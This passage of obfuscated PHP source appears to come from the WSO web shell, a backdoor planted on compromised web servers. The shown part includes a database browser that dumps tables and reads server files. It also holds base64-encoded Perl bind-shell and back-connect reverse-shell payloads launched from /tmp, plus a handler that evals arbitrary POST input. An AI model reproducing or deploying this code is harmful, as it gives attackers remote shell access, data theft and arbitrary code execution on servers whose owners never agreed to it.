	,(' . implode(', ', $sp527681) . ')'; } if ($spe0ea16) { fwrite($spe0ea16, $sp2f57d0); } else { echo $sp2f57d0; } $sp412bbc++; } if (!$sp812f81) { if ($spe0ea16) { fwrite($spe0ea16, ';

'); } else { echo ';

'; } } break; case 'pgsql': $this->query('SELECT * FROM ' . $sp110772); while ($sp527681 = $this->fetch()) { $spba3e65 = array(); foreach ($sp527681 as $sp8db113 => $sp6d4391) { $sp527681[$sp8db113] = '\'' . addslashes($sp6d4391) . '\''; $spba3e65[] = $sp8db113; } $sp2f57d0 = 'INSERT INTO ' . $sp110772 . ' (' . implode(', ', $spba3e65) . ') VALUES (' . implode(', ', $sp527681) . ');' . '
'; if ($spe0ea16) { fwrite($spe0ea16, $sp2f57d0); } else { echo $sp2f57d0; } } break; } return false; } } $sp95ae53 = new DbClass($_POST['type']); if (@$_POST['p2'] == 'download' && @$_POST['p1'] != 'select') { $sp95ae53->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']); $sp95ae53->selectdb($_POST['sql_base']); switch ($_POST['charset']) { case 'Windows-1251': $sp95ae53->setCharset('cp1251'); break; case 'UTF-8': $sp95ae53->setCharset('utf8'); break; case 'KOI8-R': $sp95ae53->setCharset('koi8r'); break; case 'KOI8-U': $sp95ae53->setCharset('koi8u'); break; case 'cp866': $sp95ae53->setCharset('cp866'); break; } if (empty($_POST['file'])) { ob_start('ob_gzhandler', 4096); header('Content-Disposition: attachment; filename=dump.sql'); header('Content-Type: text/plain'); foreach ($_POST['tbl'] as $sp6d4391) { $sp95ae53->dump($sp6d4391); } die; } elseif ($spe0ea16 = @fopen($_POST['file'], 'w')) { foreach ($_POST['tbl'] as $sp6d4391) { $sp95ae53->dump($sp6d4391, $spe0ea16); } fclose($spe0ea16); unset($_POST['p2']); } else { die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>'); } } wsoHeader(); echo '
    <h1>Sql browser</h1><div class=content>
    <form name=\'sf\' method=\'post\' onsubmit=\'fs(this);\'><table cellpadding=\'2\' cellspacing=\'0\'><tr>
    <td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
    <input type=hidden name=a value=Sql><input type=hidden name=p1 value=\'query\'><input type=hidden name=p2 value=\'\'><input type=hidden name=c value=\'' . htmlspecialchars($sp2eb6c3['cwd']) . '\'><input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '\'>
    <td><select name=\'type\'><option value=\'mysql\' '; if (@$_POST['type'] == 'mysql') { echo 'selected'; } echo '>MySql</option><option value=\'pgsql\' '; if (@$_POST['type'] == 'pgsql') { echo 'selected'; } echo '>PostgreSql</option></select></td>
    <td><input type=text name=sql_host value="' . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . '"></td>
    <td><input type=text name=sql_login value="' . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . '"></td>
    <td><input type=text name=sql_pass value="' . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . '"></td><td>'; $sp5a7cd5 = '<input type=text name=sql_base value=\'\'>'; if (isset($_POST['sql_host'])) { if ($sp95ae53->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) { switch ($_POST['charset']) { case 'Windows-1251': $sp95ae53->setCharset('cp1251'); break; case 'UTF-8': $sp95ae53->setCharset('utf8'); break; case 'KOI8-R': $sp95ae53->setCharset('koi8r'); break; case 'KOI8-U': $sp95ae53->setCharset('koi8u'); break; case 'cp866': $sp95ae53->setCharset('cp866'); break; } $sp95ae53->listDbs(); echo '<select name=sql_base><option value=\'\'></option>'; while ($sp527681 = $sp95ae53->fetch()) { list($sp7ac89e, $sp8e17b7) = each($sp527681); echo '<option value="' . $sp8e17b7 . '" ' . ($sp8e17b7 == $_POST['sql_base'] ? 'selected' : '') . '>' . $sp8e17b7 . '</option>'; } echo '</select>'; } else { echo $sp5a7cd5; } } else { echo $sp5a7cd5; } echo '</td>
    				<td><input type=submit value=\'>>\' onclick=\'fs(d.sf);\'></td>
                    <td><input type=checkbox name=sql_count value=\'on\'' . (empty($_POST['sql_count']) ? '' : ' checked') . '> count the number of rows</td>
    			</tr>
    		</table>
    		<script>
                s_db=\'' . @addslashes($_POST['sql_base']) . '\';
                function fs(f) {
                    if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                        if(f.p1) f.p1.value=\'\';
                        if(f.p2) f.p2.value=\'\';
                        if(f.p3) f.p3.value=\'\';
                    }
                }
    			function st(t,l) {
    				d.sf.p1.value = \'select\';
    				d.sf.p2.value = t;
                    if(l && d.sf.p3) d.sf.p3.value = l;
    				d.sf.submit();
    			}
    			function is() {
    				for(i=0;i<d.sf.elements[\'tbl[]\'].length;++i)
    					d.sf.elements[\'tbl[]\'][i].checked = !d.sf.elements[\'tbl[]\'][i].checked;
    			}
    		</script>'; if (isset($sp95ae53) && $sp95ae53->link) { echo '<br/><table width=100% cellpadding=2 cellspacing=0>'; if (!empty($_POST['sql_base'])) { $sp95ae53->selectdb($_POST['sql_base']); echo '<tr><td width=1 style=\'border-top:2px solid #666;\'><span>Tables:</span><br><br>'; $spe7946b = $sp95ae53->listTables(); while ($sp527681 = $sp95ae53->fetch($spe7946b)) { list($sp7ac89e, $sp8e17b7) = each($sp527681); if (!empty($_POST['sql_count'])) { $sp5c3411 = $sp95ae53->fetch($sp95ae53->query('SELECT COUNT(*) as n FROM ' . $sp8e17b7 . '')); } $sp8e17b7 = htmlspecialchars($sp8e17b7); echo '<nobr><input type=\'checkbox\' name=\'tbl[]\' value=\'' . $sp8e17b7 . '\'>&nbsp;<a href=# onclick="st(\'' . $sp8e17b7 . '\',1)">' . $sp8e17b7 . '</a>' . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$sp5c3411['n']})</small>") . '</nobr><br>'; } echo '<input type=\'checkbox\' onclick=\'is();\'> <input type=button value=\'Dump\' onclick=\'document.sf.p2.value="download";document.sf.submit();\'><br>File path:<input type=text name=file value=\'dump.sql\'></td><td style=\'border-top:2px solid #666;\'>'; if (@$_POST['p1'] == 'select') { $_POST['p1'] = 'query'; $_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1; $sp95ae53->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']); $sp6cf735 = $sp95ae53->fetch(); $sp9c43a9 = ceil($sp6cf735['n'] / 30); echo '<script>d.sf.onsubmit=function(){st("' . $_POST['p2'] . '", d.sf.p3.value)}</script><span>' . $_POST['p2'] . "</span> ({$sp6cf735['n']} records) Page # <input type=text name='p3' value=" . (int) $_POST['p3'] . '>'; echo " of {$sp9c43a9}"; if ($_POST['p3'] > 1) { echo ' <a href=# onclick=\'st("' . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ')\'>&lt; Prev</a>'; } if ($_POST['p3'] < $sp9c43a9) { echo ' <a href=# onclick=\'st("' . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ')\'>Next &gt;</a>'; } $_POST['p3']--; if ($_POST['type'] == 'pgsql') { $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . $_POST['p3'] * 30; } else { $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . $_POST['p3'] * 30 . ',30'; } echo '<br><br>'; } if (@$_POST['p1'] == 'query' && !empty($_POST['p2'])) { $sp95ae53->query(@$_POST['p2']); if ($sp95ae53->res !== false) { $sp7a81ba = false; echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">'; $sp47b792 = 1; while ($sp527681 = $sp95ae53->fetch()) { if (!$sp7a81ba) { echo '<tr>'; foreach ($sp527681 as $sp7ac89e => $sp8e17b7) { echo '<th>' . $sp7ac89e . '</th>'; } reset($sp527681); $sp7a81ba = true; echo '</tr><tr>'; $sp47b792 = 2; } echo '<tr class="l' . $sp47b792 . '">'; $sp47b792 = $sp47b792 == 1 ? 2 : 1; foreach ($sp527681 as $sp7ac89e => $sp8e17b7) { if ($sp8e17b7 == null) { echo '<td><i>null</i></td>'; } else { echo '<td>' . nl2br(htmlspecialchars($sp8e17b7)) . '</td>'; } } echo '</tr>'; } echo '</table>'; } else { echo '<div><b>Error:</b> ' . htmlspecialchars($sp95ae53->error()) . '</div>'; } } echo '<br></form><form onsubmit=\'d.sf.p1.value="query";d.sf.p2.value=this.query.value;document.sf.submit();return false;\'><textarea name=\'query\' style=\'width:100%;height:100px\'>'; if (!empty($_POST['p2']) && $_POST['p1'] != 'loadfile') { echo htmlspecialchars($_POST['p2']); } echo '</textarea><br/><input type=submit value=\'Execute\'>'; echo '</td></tr>'; } echo '</table></form><br/>'; if ($_POST['type'] == 'mysql') { $sp95ae53->query('SELECT 1 FROM mysql.user WHERE concat(`user`, \'@\', `host`) = USER() AND `File_priv` = \'y\''); if ($sp95ae53->fetch()) { echo '<form onsubmit=\'d.sf.p1.value="loadfile";document.sf.p2.value=this.f.value;document.sf.submit();return false;\'><span>Load file</span> <input  class=\'toolsInp\' type=text name=f><input type=submit value=\'>>\'></form>'; } } if (@$_POST['p1'] == 'loadfile') { $sp7ff75d = $sp95ae53->loadFile($_POST['p2']); echo '<br/><pre class=ml1>' . htmlspecialchars($sp7ff75d['file']) . '</pre>'; } } else { echo htmlspecialchars($sp95ae53->error()); } echo '</div>'; wsoFooter(); } function actionNetwork() { wsoHeader(); $spc916f4 = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7'; $sp172443 = 'IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0='; echo '<h1>Network tools</h1><div class=content>
    	<form name=\'nfp\' onSubmit="g(null,null,\'bpp\',this.port.value);return false;">
    	<span>Bind port to /bin/sh [perl]</span><br/>
    	Port: <input type=\'text\' name=\'port\' value=\'31337\'> <input type=submit value=\'>>\'>
    	</form>
    	<form name=\'nfp\' onSubmit="g(null,null,\'bcp\',this.server.value,this.port.value);return false;">
    	<span>Back-connect  [perl]</span><br/>
    	Server: <input type=\'text\' name=\'server\' value=\'' . $_SERVER['REMOTE_ADDR'] . '\'> Port: <input type=\'text\' name=\'port\' value=\'31337\'> <input type=submit value=\'>>\'>
    	</form><br>'; if (isset($_POST['p1'])) { function cf($sp1b2b3c, $sp7a18b6) { $spbc6c6b = @fopen($sp1b2b3c, 'w') or @function_exists('file_put_contents'); if ($spbc6c6b) { @fwrite($spbc6c6b, @base64_decode($sp7a18b6)); @fclose($spbc6c6b); } } if ($_POST['p1'] == 'bpp') { cf('/tmp/bp.pl', $sp172443); $spb3b003 = wsoEx('perl /tmp/bp.pl ' . $_POST['p2'] . ' 1>/dev/null 2>&1 &'); sleep(1); echo "<pre class=ml1>{$spb3b003}\n" . wsoEx('ps aux | grep bp.pl') . '</pre>'; unlink('/tmp/bp.pl'); } if ($_POST['p1'] == 'bcp') { cf('/tmp/bc.pl', $spc916f4); $spb3b003 = wsoEx('perl /tmp/bc.pl ' . $_POST['p2'] . ' ' . $_POST['p3'] . ' 1>/dev/null 2>&1 &'); sleep(1); echo "<pre class=ml1>{$spb3b003}\n" . wsoEx('ps aux | grep bc.pl') . '</pre>'; unlink('/tmp/bc.pl'); } } echo '</div>'; wsoFooter(); } function actionRC() { if (!@$_POST['p1']) { $spd09f64 = array('uname' => php_uname(), 'php_version' => phpversion(), 'wso_version' => WSO_VERSION, 'safemode' => @ini_get('safe_mode')); echo serialize($spd09f64); } else { eval($_POST['p1']); } } if (empty($_POST['a'])) { if (isset($spa13dd5) && function_exists('action' . $spa13dd5)) { $_POST['a'] = $spa13dd5; } else { $_POST['a'] = 'SecInfo'; } } if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) { call_user_func('action' . $_POST['a']); } echo '[syslog]03
'; die;